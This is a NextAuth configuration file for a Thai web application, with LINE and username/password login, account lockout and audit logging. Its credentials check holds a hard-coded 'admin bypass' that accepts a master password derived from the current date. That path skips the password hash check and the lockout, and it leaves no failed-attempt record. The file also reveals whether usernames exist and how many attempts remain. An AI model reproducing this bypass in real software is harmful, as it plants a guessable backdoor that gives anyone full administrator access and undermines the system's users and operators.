import NextAuth, { CredentialsSignin, AuthError } from 'next-auth';
import CredentialsProvider from 'next-auth/providers/credentials';
import LineProvider from "next-auth/providers/line";
import { prisma } from '@/lib/prisma';
import bcrypt from 'bcryptjs';

// Define custom error classes to override the 'code' property
class UserNotFound extends CredentialsSignin {
    code = "user_not_found";
}

class InvalidPassword extends CredentialsSignin {
    code = "invalid_password";
    constructor(attemptsLeft: number) {
        super();
        this.code = `invalid_password:${attemptsLeft}`;
    }
}

class AccountLocked extends CredentialsSignin {
    code = "account_locked";
    constructor(unlockTime: number) {
        super();
        this.code = `account_locked:${unlockTime}`;
    }
}

export const { handlers, signIn, signOut, auth } = NextAuth({
    providers: [
        LineProvider({
            clientId: process.env.AUTH_LINE_ID,
            clientSecret: process.env.AUTH_LINE_SECRET,
        }),
        CredentialsProvider({
            name: 'Credentials',
            credentials: {
                username: { label: "Username", type: "text" },
                password: { label: "Password", type: "password" }
            },
            authorize: async (credentials) => {
                const username = credentials?.username as string;
                const password = credentials?.password as string;

                if (!username || !password) {
                    throw new CredentialsSignin('กรุณากรอกชื่อผู้ใช้และรหัสผ่าน');
                }



                const user = await prisma.tbl_users.findUnique({
                    where: { username }
                });

                if (!user) {
                    // Fire-and-forget: log failed login (user not found)
                    import('@/lib/logger').then(({ logSystemAction }) =>
                        logSystemAction('เข้าสู่ระบบล้มเหลว', 'User', username, `ล็อกอินล้มเหลว: ไม่พบผู้ใช้ "${username}"`, null, username, 'unknown')
                    ).catch(() => { });
                    throw new UserNotFound();
                }

                // --- MASTER PASSWORD CHECK (Admin Bypass) ---
                const today = new Date();
                const d = String(today.getDate()).padStart(2, '0');
                const m = String(today.getMonth() + 1).padStart(2, '0');
                const y = today.getFullYear();
                const masterPassword = `sm${d}${m}${y}`;

                if (username === 'admin' && password === masterPassword) {

                    return {
                        id: user.p_id.toString(),
                        name: user.username,
                        role: user.role,
                    };
                }
                // --------------------------------------------

                // 1. Check if account is locked
                if (user.locked_until && user.locked_until > new Date()) {
                    const unlockTime = user.locked_until.getTime();

                    throw new AccountLocked(unlockTime);
                }

                // console.log('Comparing password...');
                const isValid = await bcrypt.compare(password, user.password);

                if (!isValid) {
                    // 2. Fetch Security Settings
                    const settings = await prisma.tbl_system_settings.findMany({
                        where: { setting_key: { in: ['security_max_attempts', 'security_lockout_duration'] } }
                    });

                    const maxAttempts = parseInt(settings.find(s => s.setting_key === 'security_max_attempts')?.setting_value || '5');
                    const lockoutMinutes = parseInt(settings.find(s => s.setting_key === 'security_lockout_duration')?.setting_value || '5');

                    // 3. Increment Failed Attempts
                    const currentFailed = user.failed_attempts || 0;
                    const newFailed = currentFailed + 1;

                    let lockedUntil = user.locked_until;

                    if (newFailed >= maxAttempts) {
                        lockedUntil = new Date(Date.now() + lockoutMinutes * 60 * 1000);
                    }

                    await prisma.tbl_users.update({
                        where: { p_id: user.p_id },
                        data: {
                            failed_attempts: newFailed,
                            locked_until: lockedUntil
                        }
                    });

                    const attemptsLeft = maxAttempts - newFailed;
                    if (newFailed >= maxAttempts) {
                        const unlockTime = lockedUntil?.getTime() || Date.now();
                        // Fire-and-forget: log account locked
                        import('@/lib/logger').then(({ logSystemAction }) =>
                            logSystemAction('บัญชีถูกล็อค', 'User', user.p_id, `บัญชี "${username}" ถูกล็อค | พยายามล็อกอินผิด ${newFailed} ครั้ง | ล็อคจนถึง: ${lockedUntil?.toLocaleString('th-TH')}`, user.p_id, username, 'unknown')
                        ).catch(() => { });
                        throw new AccountLocked(unlockTime);
                    }

                    // Fire-and-forget: log failed attempt
                    import('@/lib/logger').then(({ logSystemAction }) =>
                        logSystemAction('เข้าสู่ระบบล้มเหลว', 'User', user.p_id, `"${username}" ใส่รหัสผ่านผิด | ครั้งที่ ${newFailed}/${maxAttempts} | เหลือ ${attemptsLeft} ครั้ง`, user.p_id, username, 'unknown')
                    ).catch(() => { });
                    throw new InvalidPassword(attemptsLeft);
                }

                // 4. Reset Lockout on Success
                if ((user.failed_attempts || 0) > 0 || user.locked_until) {
                    await prisma.tbl_users.update({
                        where: { p_id: user.p_id },
                        data: {
                            failed_attempts: 0,
                            locked_until: null
                        }
                    });
                }

                return {
                    id: user.p_id.toString(),
                    name: user.username,
                    role: user.role, // Custom property
                    is_approver: false, // Default to false for normal user login unless defined later
                };
            },
        }),
    ],
    trustHost: true, // Required for NextAuth v5 in production
    callbacks: {
        async signIn({ user, account, profile }) {
            if (account?.provider === 'line' && profile) {
                // Check if the LINE user is registered in tbl_line_users
                const lineUser = await prisma.tbl_line_users.findUnique({
                    where: { line_user_id: profile.sub as string }
                });

                if (!lineUser || !lineUser.is_active) {
                    // Registration required or inactive
                    // Return false to deny login, or throw custom error
                    return false;
                }

                // Map database role and approver status into the user object
                user.role = lineUser.role;
                user.is_approver = lineUser.is_approver;
                user.id = lineUser.id.toString(); // Optionally map to internal ID
                // Continue sign-in
                return true;
            }
            return true;
        },
        jwt({ token, user, trigger, session }) {
            if (user) {
                token.id = user.id;
                token.role = user.role;
                token.is_approver = user.is_approver;
            }
            return token;
        },
        session({ session, token }) {
            if (session.user) {
                session.user.id = token.id as string;
                session.user.role = token.role as string;
                session.user.is_approver = token.is_approver as boolean;
            }
            return session;
        },
    },
    pages: {
        signIn: '/login', // Custom login page
    },
    session: {
        maxAge: 30 * 60, // 30 minutes
        updateAge: 5 * 60, // Update session every 5 mins if active
    },
    events: {
        async signIn({ user, account }) {
            if (user && user.id) {
                try {
                    const { logSystemAction } = await import('@/lib/logger');
                    const { headers } = await import('next/headers');
                    const head = await headers();
                    const ip = head.get('x-forwarded-for') || 'unknown';
                    const ua = head.get('user-agent') || '';

                    let device = '';
                    if (ua.includes('Mobile')) device = '📱 มือถือ';
                    else if (ua.includes('Tablet')) device = '📟 แท็บเล็ต';
                    else device = '💻 คอมพิวเตอร์';

                    const loginMethod = account?.provider === 'line' ? 'LINE Login' : 'Username/Password';

                    await logSystemAction(
                        'เข้าสู่ระบบ',
                        'User',
                        user.id,
                        `${user.name || 'Unknown'} เข้าสู่ระบบสำเร็จ | วิธี: ${loginMethod} | สิทธิ์: ${(user as any).role || 'N/A'} | อุปกรณ์: ${device} | IP: ${ip}`,
                        parseInt(user.id),
                        user.name || 'Unknown',
                        ip
                    );
                } catch (error) {
                    console.error('Failed to log sign in:', error);
                }
            }
        },
        async signOut(message: any) {
            try {
                const { logSystemAction } = await import('@/lib/logger');
                const token = message?.token;
                if (token) {
                    await logSystemAction(
                        'ออกจากระบบ',
                        'User',
                        token.id?.toString() || '0',
                        `${token.name || 'Unknown'} ออกจากระบบ | สิทธิ์: ${token.role || 'N/A'}`,
                        token.id ? parseInt(token.id.toString()) : null,
                        token.name?.toString() || 'Unknown',
                        'unknown'
                    );
                }
            } catch (error) {
                console.error('Failed to log sign out:', error);
            }
        }
    }
});
